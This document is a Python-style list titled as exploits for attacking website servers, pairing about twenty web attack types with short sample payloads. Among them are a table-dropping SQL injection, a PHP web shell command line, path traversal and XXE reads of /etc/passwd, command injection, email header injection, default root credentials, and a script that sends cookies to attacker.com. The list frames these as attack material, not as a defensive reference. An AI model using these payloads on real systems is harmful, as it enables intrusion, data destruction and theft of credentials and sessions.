# List of Exploits to Target the Server of websites(Not the Page)

exploits = [
    # SQL Injection (SQLi)
    {
        "type": "SQL Injection (SQLi)",
        "description": "Exploits poorly sanitized database queries to execute arbitrary SQL commands on the server.",
        "payload": "'; DROP TABLE users; --"
    },
    
    # Remote Code Execution (RCE)
    {
        "type": "Remote Code Execution (RCE)",
        "description": "Allows attackers to run arbitrary commands or scripts on the server.",
        "payload": "<?php system($_GET['cmd']); ?>"
    },
    
    # File Upload Vulnerabilities
    {
        "type": "File Upload Vulnerabilities",
        "description": "Exploits weaknesses in the file upload functionality to upload malicious files (e.g., web shells).",
        "payload": "Upload a PHP file that contains malicious code (`<?php phpinfo(); ?>`)"
    },
    
    # Directory Traversal
    {
        "type": "Directory Traversal",
        "description": "Accessing files outside the intended directory by manipulating file paths.",
        "payload": "../../../../etc/passwd"
    },
    
    # Cross-Site Scripting (XSS) - Server Side Impact
    {
        "type": "Cross-Site Scripting (XSS) - Server Side Impact",
        "description": "Exploiting vulnerable XSS implementations that can inject scripts or data into the server (useful for SSRF or other server-side attacks).",
        "payload": "<script>fetch('http://attacker.com?cookie='+document.cookie);</script>"
    },
    
    # Server-Side Request Forgery (SSRF)
    {
        "type": "Server-Side Request Forgery (SSRF)",
        "description": "Exploits vulnerabilities to make requests from the server to internal resources or other systems that would normally be inaccessible.",
        "payload": "http://localhost:8080/admin"
    },
    
    # XML External Entity (XXE) Injection
    {
        "type": "XML External Entity (XXE) Injection",
        "description": "Exploits improper XML parsing that allows malicious XML files to trigger the server to interact with unauthorized systems.",
        "payload": "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <foo>&xxe;</foo>"
    },
    
    # Command Injection
    {
        "type": "Command Injection",
        "description": "Injects arbitrary shell commands into an application's input fields or parameters.",
        "payload": "; ls /var/www"
    },
    
    # Denial of Service (DoS)/Distributed Denial of Service (DDoS)
    {
        "type": "Denial of Service (DoS)/Distributed Denial of Service (DDoS)",
        "description": "Overloading the server with requests, causing it to crash or become unavailable.",
        "payload": "Using tools like LOIC, Slowloris, or custom scripts to flood the server with requests."
    },
    
    # Weak File Permissions
    {
        "type": "Weak File Permissions",
        "description": "Exploits weak permissions on server files or directories that allow unauthorized users to read, modify, or delete files.",
        "payload": "Exploiting world-readable or writable files, or files without proper user access controls."
    },
    
    # Misconfigured Web Server (e.g., Apache, Nginx)
    {
        "type": "Misconfigured Web Server (e.g., Apache, Nginx)",
        "description": "Exploits misconfigurations in the web server that expose sensitive server information or allow unauthorized access to restricted areas.",
        "payload": "Exposing sensitive server files via misconfigured directories or improper handling of .htaccess."
    },
    
    # HTTP Response Splitting
    {
        "type": "HTTP Response Splitting",
        "description": "Splits an HTTP response, allowing an attacker to inject headers or content into the server's response.",
        "payload": "HTTP/1.1 200 OK\r\nSet-Cookie: sessionid=attacker_session;"
    },
    
    # Privilege Escalation
    {
        "type": "Privilege Escalation",
        "description": "Exploits vulnerabilities in the server to escalate privileges, allowing an attacker to gain administrative access or root-level control.",
        "payload": "Leveraging sudo or weak permissions to escalate a low-privileged user to root access."
    },
    
    # Server Misconfigurations - .env files
    {
        "type": "Server Misconfigurations - .env files",
        "description": "Misconfigured .env files containing sensitive environment variables (such as DB credentials) can be accessed by attackers.",
        "payload": "/etc/.env or /.env in URL"
    },
    
    # Insecure Direct Object References (IDOR)
    {
        "type": "Insecure Direct Object References (IDOR)",
        "description": "Exploits weak access control that allows users to access or modify objects (files, records, etc.) they should not have access to.",
        "payload": "Changing the URL parameter to access other user accounts: /profile?id=12345 to /profile?id=1."
    },
    
    # Cross-Site Request Forgery (CSRF)
    {
        "type": "Cross-Site Request Forgery (CSRF)",
        "description": "Triggers unwanted actions on the server on behalf of a user who is authenticated.",
        "payload": "<img src='https://victim.com/logout?session_id=123456' />"
    },
    
    # Email Header Injection
    {
        "type": "Email Header Injection",
        "description": "Injects malicious headers into email content sent by the server.",
        "payload": "Subject: Test\r\nBCC: attacker@example.com"
    },
    
    # Insecure Deserialization
    {
        "type": "Insecure Deserialization",
        "description": "Exploits server deserialization mechanisms to inject malicious data that the server processes or evaluates.",
        "payload": "Malformed serialized object or data."
    },
    
    # Path Traversal (in URL parameter)
    {
        "type": "Path Traversal (in URL parameter)",
        "description": "Exploits improper handling of file paths in server-side scripts to access files outside the allowed directories.",
        "payload": "../../../../etc/passwd"
    },
    
    # Privilege Escalation via Default Credentials
    {
        "type": "Privilege Escalation via Default Credentials",
        "description": "Exploiting systems with default usernames and passwords (common in IoT or admin tools).",
        "payload": "Default credentials like admin:admin or root:toor."
    }
]
